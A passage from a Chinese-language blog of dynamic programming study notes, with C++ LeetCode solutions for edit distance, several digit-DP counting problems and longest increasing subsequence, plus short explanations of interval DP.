<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m=word<span class="number">1.</span><span class="built_in">size</span>(),n=word<span class="number">2.</span><span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m<span class="number">+1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n<span class="number">+1</span>,INT_MAX/<span class="number">2</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++) dp[<span class="number">0</span>][j]=j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) dp[i][<span class="number">0</span>]=i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(word1[i<span class="number">-1</span>]==word2[j<span class="number">-1</span>])&#123;</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">// 对word1插入一个字符，与word2[j]匹配</span></span><br><span class="line">                    <span class="comment">// 对word1删除一个字符，word1[i-1]与word2[j]匹配</span></span><br><span class="line">                    <span class="comment">// 替换一个字符</span></span><br><span class="line">                    dp[i][j]=<span class="built_in">min</span>(dp[i][j<span class="number">-1</span>],<span class="built_in">min</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>]))<span class="number">+1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>空间优化</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m=word<span class="number">1.</span><span class="built_in">size</span>(),n=word<span class="number">2.</span><span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(<span class="number">2</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n<span class="number">+1</span>,INT_MAX/<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=n;j++) dp[<span class="number">0</span>][j]=j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="type">int</span> idx=i%<span class="number">2</span>;</span><br><span class="line">            dp[idx][<span class="number">0</span>]=i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(word1[i<span class="number">-1</span>]==word2[j<span class="number">-1</span>])&#123;</span><br><span class="line">                    dp[idx][j]=dp[<span class="number">1</span>-idx][j<span class="number">-1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">// 对word1插入一个字符，与word2[j]匹配</span></span><br><span class="line">                    <span class="comment">// 对word1删除一个字符，word1[i-1]与word2[j]匹配</span></span><br><span class="line">                    <span class="comment">// 替换一个字符</span></span><br><span class="line">                    dp[idx][j]=<span class="built_in">min</span>(dp[idx][j<span class="number">-1</span>],<span class="built_in">min</span>(dp[<span class="number">1</span>-idx][j],dp[<span class="number">1</span>-idx][j<span class="number">-1</span>]))<span class="number">+1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m%<span class="number">2</span>][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox7" checked="true"><label for="checkbox7"></label><a href="https://leetcode.cn/problems/2-keys-keyboard/">650. 只有两个键的键盘</a>（同过乘除计算位置）</p>
</li>
<li class="lvl-2">
<p>[ ]</p>
</li>
</ul>
<h1>6 区间DP</h1>
<h2 id="6-1-定义">6.1 定义</h2>
<p>区间类动态规划是线性动态规划的扩展，它在分阶段地划分问题时，与阶段中元素出现的顺序和由前一阶段的哪些元素合并而来有很大的关系。</p>
<p>令状态$f(i,j)$表示将下标位置$i$到$j$的所有元素合并能获得的价值的最大值，那么 $f(i,j)=\max{f(i,k)+f(k+1,j)+cost}$为将这两组元素合并起来的代价。</p>
<h2 id="6-2-性质">6.2 性质</h2>
<p>区间 DP 有以下特点：</p>
<p><strong>合并</strong>：即将两个或多个部分进行整合，当然也可以反过来；</p>
<p><strong>特征</strong>：能将问题分解为能两两合并的形式；</p>
<p><strong>求解</strong>：对整个问题设最优值，枚举合并点，将问题分解为左右两个部分，最后合并两个部分的最优值得到原问题的最优值。</p>
<h1>7 数位DP</h1>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> s:对上边界数字转为字符串</span></span><br><span class="line"><span class="comment"> i:当前填第i个数字</span></span><br><span class="line"><span class="comment"> mask: 标记已经填过了哪些数字（数字不可重复使用）</span></span><br><span class="line"><span class="comment"> isLimited：当前位置填入数字是否受到限制</span></span><br><span class="line"><span class="comment"> isNum：前面是否填过数字（数字是否可以从0开始）</span></span><br><span class="line"><span class="comment"> dp：记忆化搜索，记录已经查找过的结果，dp[i][j]表示前面[:i-1]的情况为j，第i位数字及其之后共有多少种选择</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//backtrack(s,i,mask,isLimited,isNum,dp)从左到右填第i位及其之后数位的合法方案数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">backtrack</span><span class="params">(s,i,mask,isLimited,isNum,dp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i==s.<span class="built_in">size</span>())</span><br><span class="line">        <span class="keyword">return</span> isNum;</span><br><span class="line">   	<span class="keyword">if</span>(!isLimited&amp;&amp;isNum&amp;&amp;dp[i][mask]&gt;=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> dp[i][mask]</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!isNum)</span><br><span class="line">        res+=<span class="built_in">backtrack</span>(s,i<span class="number">+1</span>,mask,<span class="literal">false</span>,<span class="literal">false</span>,dp);</span><br><span class="line">   	</span><br><span class="line">    <span class="type">int</span> up=isLimited?s[i]-<span class="string">&#x27;0&#x27;</span>:<span class="number">9</span>;</span><br><span class="line">    <span class="comment">//前面已经填过数字，当前位置可以填0，否则填1</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> d=<span class="number">1</span>-isNum;d&lt;=up;d++)&#123;</span><br><span class="line">        <span class="comment">//数字d未使用过</span></span><br><span class="line">        <span class="keyword">if</span>((mask&amp;(<span class="number">1</span>&lt;&lt;d))==<span class="number">0</span>)&#123;</span><br><span class="line">            res+=<span class="built_in">backtrack</span>(s,i<span class="number">+1</span>,mask|<span class="number">1</span>&lt;&lt;d,isLimited&amp;&amp;d==up,<span class="literal">true</span>,dp);</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//缓存当前结果</span></span><br><span class="line">    <span class="keyword">if</span>(!isLimited&amp;&amp;isNum)</span><br><span class="line">        dp[i][mask]=res;</span><br><span class="line">   	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-1-1-题目">7.1.1 题目</h3>
<h4 id="7-1-1-1-6957-统计范围内的步进数字数目">7.1.1.1 <a href="https://leetcode.cn/problems/count-stepping-numbers-in-range/">6957. 统计范围内的步进数字数目</a></h4>
<blockquote>
<p><mark>取模相减结果为负数</mark></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MOD=<span class="number">1e9</span><span class="number">+7</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countSteppingNumbers</span><span class="params">(string low, string high)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m=low.<span class="built_in">size</span>(),n=high.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp1</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">10</span>,<span class="number">-1</span>)),<span class="built_in">dp2</span>(m,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">10</span>,<span class="number">-1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> r=<span class="built_in">backtrack</span>(high,<span class="number">0</span>,<span class="literal">false</span>,<span class="literal">true</span>,dp1,<span class="number">-1</span>);</span><br><span class="line">        <span class="type">int</span> l=<span class="built_in">backtrack</span>(low,<span class="number">0</span>,<span class="literal">false</span>,<span class="literal">true</span>,dp2,<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ((r-l)+MOD+<span class="built_in">valid</span>(low))%MOD;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">valid</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> n=s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">abs</span>(s[i]-s[i<span class="number">-1</span>])!=<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">backtrack</span><span class="params">(string &amp;s,<span class="type">int</span> i,<span class="type">bool</span> isNum,<span class="type">bool</span> isLimit,vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; dp,<span class="type">int</span> pre)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==s.<span class="built_in">size</span>())</span><br><span class="line">            <span class="keyword">return</span> isNum;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(!isLimit&amp;&amp;isNum&amp;&amp;dp[i][pre]!=<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">return</span> dp[i][pre];</span><br><span class="line">        </span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(!isNum)</span><br><span class="line">            res+=<span class="built_in">backtrack</span>(s,i<span class="number">+1</span>,<span class="literal">false</span>,<span class="literal">false</span>,dp,<span class="number">-1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> up=isLimit?s[i]-<span class="string">&#x27;0&#x27;</span>:<span class="number">9</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> d=<span class="number">1</span>-isNum;d&lt;=up;d++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pre==<span class="number">-1</span>||<span class="built_in">abs</span>(d-pre)==<span class="number">1</span>)</span><br><span class="line">                res=(res+<span class="built_in">backtrack</span>(s,i<span class="number">+1</span>,<span class="literal">true</span>,isLimit&amp;&amp;d==up,dp,d))%MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(isNum&amp;&amp;!isLimit)</span><br><span class="line">            dp[i][pre]=res;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="7-1-1-2-2719-统计整数数目">7.1.1.2 <a href="https://leetcode.cn/problems/count-of-integers/">2719. 统计整数数目</a></h4>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202306071723806.png" alt="DP"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution1</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">count</span><span class="params">(string num1, string num2, <span class="type">int</span> min_sum, <span class="type">int</span> max_sum)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans = (<span class="built_in">helper</span>(num2, min_sum, max_sum) + MOD -</span><br><span class="line">                   <span class="built_in">helper</span>(num1, min_sum, max_sum)) %</span><br><span class="line">                  MOD;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> &amp;ch : num1) &#123;</span><br><span class="line">            sum += ch - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ans += sum &gt;= min_sum &amp;&amp; sum &lt;= max_sum;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算x&lt;=num，且min_sum&lt;=x&lt;=max_sum数字个数</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(string &amp;num, <span class="type">int</span> &amp;min_sum, <span class="type">int</span> &amp;max_sum)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = num.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">// 编译器不支持变长数组声明</span></span><br><span class="line">        <span class="comment">// int memo[n][min(9 * n, max_sum) + 1];</span></span><br><span class="line">        <span class="comment">// memset(memo, -1, sizeof(memo));</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">memo</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="built_in">min</span>(<span class="number">9</span> * n, max_sum) + <span class="number">1</span>, <span class="number">-1</span>));</span><br><span class="line">        function&lt;<span class="type">int</span>(<span class="type">int</span>, <span class="type">int</span>, <span class="type">bool</span>)&gt; f = [&amp;](<span class="type">int</span> i, <span class="type">int</span> sum,</span><br><span class="line">                                              <span class="type">bool</span> isLimited) -&gt; <span class="type">int</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (sum &gt; max_sum) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i == num.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                <span class="keyword">return</span> sum &gt;= min_sum;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!isLimited &amp;&amp; memo[i][sum] != <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> memo[i][sum];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> up = isLimited ? num[i] - <span class="string">&#x27;0&#x27;</span> : <span class="number">9</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> d = <span class="number">0</span>; d &lt;= up; d++) &#123;</span><br><span class="line">                res = (res + <span class="built_in">f</span>(i + <span class="number">1</span>, sum + d, isLimited &amp;&amp; d == up)) % MOD;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!isLimited)</span><br><span class="line">                memo[i][sum] = res;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">int</span> res = <span class="built_in">f</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="7-1-1-3-600-不含连续1的非负整数">7.1.1.3 <a href="https://leetcode.cn/problems/non-negative-integers-without-consecutive-ones/">600. 不含连续1的非负整数</a></h4>
<blockquote>
<p>给定一个正整数 <code>n</code> ，请你统计在 <code>[0, n]</code> 范围的非负整数中，有多少个整数的二进制表示中不存在 <strong>连续的 1</strong> 。</p>
</blockquote>
<h5 id="7-1-1-3-1-方法一">7.1.1.3.1 方法一</h5>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findIntegers</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> tmp=n,cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(tmp)&#123;</span><br><span class="line">            tmp=tmp/<span class="number">2</span>;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//cnt记录n的二进制表示有多少位</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(cnt<span class="number">-1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">2</span>,<span class="number">-1</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">backtrack</span>(n,cnt<span class="number">-1</span>,<span class="literal">true</span>,<span class="literal">false</span>,dp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">backtrack</span><span class="params">(<span class="type">int</span>&amp; n,<span class="type">int</span> i,<span class="type">bool</span> isLimited,<span class="type">bool</span> pre1, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; dp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!isLimited&amp;&amp;dp[i][pre1]&gt;=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> dp[i][pre1];</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">// n&amp;(1&lt;&lt;i)</span></span><br><span class="line">        <span class="type">int</span> up=isLimited?(n&gt;&gt;i)&amp;<span class="number">1</span>:<span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 当前位填0</span></span><br><span class="line">        res+=<span class="built_in">backtrack</span>(n,i<span class="number">-1</span>,isLimited&amp;&amp;up==<span class="number">0</span>,<span class="literal">false</span>,dp);</span><br><span class="line">        <span class="keyword">if</span>(!pre1&amp;&amp;up==<span class="number">1</span>)</span><br><span class="line">            res+=<span class="built_in">backtrack</span>(n,i<span class="number">-1</span>,isLimited&amp;&amp;up==<span class="number">1</span>,<span class="literal">true</span>,dp);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(!isLimited)</span><br><span class="line">            dp[i][pre1]=res;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="7-1-1-3-2-方法二">7.1.1.3.2 方法二</h5>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202306072019253.png" alt="DP-600. 不含连续1的非负整数"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findIntegers</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// dp[i]表示根节点位0，高度为i的满二叉树中个数</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(<span class="number">31</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;<span class="number">31</span>;i++)&#123;</span><br><span class="line">            dp[i]=dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>,pre=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">29</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="comment">// 第i位为1，可以填0</span></span><br><span class="line">            <span class="keyword">if</span>((n&gt;&gt;i)&amp;<span class="number">1</span>)&#123;</span><br><span class="line">                res+=dp[i];</span><br><span class="line">                cout&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">                <span class="keyword">if</span>(pre==<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                pre=<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="7-1-1-4-233-数字-1-的个数">7.1.1.4 <a href="https://leetcode.cn/problems/number-of-digit-one/">233. 数字 1 的个数</a></h4>
<blockquote>
<p>cnt1要作为记忆化搜索参数原因：</p>
<p>dp(i,cnt1)：i位前面填了cnt1个1，i及其之后不受限时含有的数字1个数</p>
<p>dp(n,0)=1：当前数字为1时有1个1</p>
<p>dp(n,1)=11：当前数字至少会有一个1，11时有两个1</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countDigitOne</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        string s=<span class="built_in">to_string</span>(n);</span><br><span class="line">        <span class="type">int</span> m=s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m,<span class="number">-1</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">backtrack</span>(s,<span class="number">0</span>,<span class="literal">true</span>,<span class="number">0</span>,dp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//dp[i][cnt1]填i以及之后位置时，前面已经填了cnt1个1</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">backtrack</span><span class="params">(string &amp;s,<span class="type">int</span> i,<span class="type">bool</span> isLimited,<span class="type">int</span> cnt1,vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; dp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==s.<span class="built_in">size</span>())</span><br><span class="line">            <span class="keyword">return</span> cnt1;</span><br><span class="line">        <span class="keyword">if</span>(!isLimited&amp;&amp;dp[i][cnt1]&gt;=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> dp[i][cnt1];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> up=isLimited?s[i]-<span class="string">&#x27;0&#x27;</span>:<span class="number">9</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> d=<span class="number">0</span>;d&lt;=up;d++)&#123;</span><br><span class="line">            res+=<span class="built_in">backtrack</span>(s,i<span class="number">+1</span>,isLimited&amp;&amp;d==up,cnt1+(d==<span class="number">1</span>),dp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!isLimited)</span><br><span class="line">            dp[i][cnt1]=res;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>8 dp[i]表示从头到下标i的某一性质</h1>
<h4 id="8-1-1-1-剑指-Offer-46-把数字翻译成字符串">8.1.1.1 <a href="https://leetcode.cn/problems/ba-shu-zi-fan-yi-cheng-zi-fu-chuan-lcof/">剑指 Offer 46. 把数字翻译成字符串</a></h4>
<h1>9 子序列</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>子序列+不考虑相邻元素：选或不选</p>
</li>
<li class="lvl-2">
<p>子序列+考虑相邻元素，枚举选哪个</p>
</li>
</ul>
<blockquote>
<p>定义dp数组,dp[i]表示到位置i为止的子序列的性质。</p>
<ul class="lvl-1">
<li class="lvl-2">必须以i结尾，需要遍历dp数组得到结果</li>
<li class="lvl-2">不必须以i结尾，dp数组的最后一位结果即为题目所求</li>
</ul>
</blockquote>
<h4 id="9-1-1-1-300-最长递增子序列">9.1.1.1 <a href="https://leetcode.cn/problems/longest-increasing-subsequence/">300. 最长递增子序列</a></h4>
<blockquote>
<p>给你一个整数数组 nums ，找到其中最长严格递增子序列的长度。</p>
<p>子序列 是由数组派生而来的序列，删除（或不删除）数组中的元素而不改变其余元素的顺序。例如，[3,6,2,7] 是数组 [0,3,1,6,2,2,7] 的子序列。</p>
</blockquote>
<p>求解上升子序列方法：</p>
<blockquote>
<p>动态规划</p>
<p>优化方法：</p>
<ul class="lvl-1">
<li class="lvl-2">
<p>单调栈+二分优化</p>
</li>
<li class="lvl-2">
<p>线段树、平衡树等数据结构优化</p>
</li>
</ul>
</blockquote>
<h5 id="9-1-1-1-1-DP">9.1.1.1.1 DP</h5>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n,<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[j]&lt;nums[i])&#123;</span><br><span class="line">                    dp[i]=<span class="built_in">max</span>(dp[i],dp[j]<span class="number">+1</span>);</span><br><span class="line">                    ans=<span class="built_in">max</span>(ans,dp[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="9-1-1-1-2-贪心-二分查找">9.1.1.1.2 贪心+二分查找</h5>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stk.<span class="built_in">empty</span>()||num&gt;stk.<span class="built_in">back</span>())</span><br><span class="line">                stk.<span class="built_in">push_back</span>(num);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// 找到&gt;=num的第一个位置</span></span><br><span class="line">                <span class="type">int</span> left=<span class="number">0</span>,right=stk.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">                    <span class="type">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">if</span>(stk[mid]&lt;num)</span><br><span class="line">                        left=mid<span class="number">+1</span>;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        